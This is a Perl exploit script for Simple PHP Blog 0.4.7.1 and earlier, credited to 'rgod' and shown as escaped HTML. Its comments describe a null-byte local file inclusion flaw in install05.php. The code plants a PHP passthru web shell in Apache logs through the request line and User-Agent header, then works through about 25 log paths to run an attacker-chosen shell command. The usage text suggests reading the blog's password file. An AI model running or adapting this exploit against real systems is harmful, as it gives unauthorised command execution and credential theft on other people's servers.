<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-string">#!/usr/bin/perl
use IO::Socket;

print &quot;Simple PHP Blog &lt;= 0.4.7.1 cmmnds xctn exploit\r\n&quot;;
print &quot;through arbitrary local inclusion\r\n&quot;;
print &quot;rgod rgod\@autistici.org\r\n&quot;;
print &quot;-&gt; this works with magic_quotes_gpc = Off\r\n\r\n&quot;;

# short explaination:
# we have this code in install05.php:
# &lt;?php
#	require_once('scripts/sb_functions.php');
#	global $logged_in;
#	$logged_in = logged_in( false, false );
#
#	read_config();
#
#	global $blog_config;
#	if ( isset( $_GET[ 'blog_language' ] ) ) {
#		$blog_config[ 'blog_language' ] = $_GET[ 'blog_language' ];
#	}
#
#	require_once('languages/' . $blog_config[ 'blog_language' ] . '/strings.php');
#	sb_language( 'install05' );
# ?&gt;
# ...
#
# script is not deleted after installation, so, if magic_quotes_gpc = Off,
# you can include an arbitrary file from local resources, poc:
#
# http://[target]/[path_to_blog]/install05.php?blog_language=../../../../../../etc/passwd%00
#
# (breaking path through a null char)
#
# it seems you cannot inject php code (php tags are converted to html entities)
# in SPB resources, but you can inject a shell in Apache logs, so... :
#
# http://[target]/[path]/install05.php?blog_language=../../../../../../var/log/httpd/access_log%00&amp;cmd=ls%20-la

sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

if (@ARGV &lt; 3)
{
print &quot;Usage:\r\n&quot;;
print &quot;perl spb_0471_incl.pl SERVER PATH COMMAND\r\n\r\n&quot;;
print &quot;SERVER         - Server where Simple PHP Blog is installed.\r\n&quot;;
print &quot;PATH           - Path to Simple PHP Blog (ex: /spb/ or just /)\r\n&quot;;
print &quot;COMMAND        - A shell command (\&quot;cat ./config/password.php\&quot;\r\n&quot;;
print &quot;                 to see encrypted username &amp; password)\r\n\r\n&quot;;
print &quot;Example:\r\n&quot;;
print &quot;perl spb_0471_incl.pl 192.168.1.3 /gbs/ ls -la\r\n&quot;;
exit();
}

$serv=$ARGV[0];
$path=$ARGV[1];
$cmd=&quot;&quot;; for ($i=2; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};

print &quot;[1] Injecting some code in log files ...\r\n&quot;;
$CODE=&quot;&lt;?php ob_clean();echo 666;passthru(\$_GET[cmd]);echo 666;die;?&gt;&quot;;
$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;)
or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
print $sock &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $sock &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
print $sock &quot;Connection: close\r\n\r\n&quot;;
close($sock);

# fill with possible locations
my @paths= (
&quot;../../../../../../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/acces_log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/acces.log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../../../../../../var/log/access_log&quot;,
&quot;../../../../../../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../../../../../../var/log/access_log&quot;,
&quot;../../../../../../../../../../var/log/error_log&quot;
);

  for ($i=0; $i&lt;=$#paths; $i++)
  {
    $a = $i + 2;
    print &quot;[&quot;.$a.&quot;] trying with &quot;.$paths[$i].&quot;%00 for blog_language argument...\r\n&quot;;
    $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;)
    or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
    print $sock &quot;GET &quot;.$path.&quot;install05.php?cmd=&quot;.$cmd.&quot;&amp;blog_language=&quot;.urlEncode($paths[$i]).&quot;%00 HTTP/1.1\r\n&quot;;
    print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
    print $sock &quot;Connection: close\r\n\r\n&quot;;
    $out='';
    while ($answer = &lt;$sock&gt;) {
    $out.=$answer;
    }
    close($sock);
    @temp= split /666/,$out,3;
    if ($#temp&gt;1) {print &quot;\r\nExploit succeeded...\r\n&quot;.$temp[1];exit();}

  }
  #if you are here...
  print &quot;\r\nExploit failed...\r\n&quot;;
</span></span>
</code></pre>
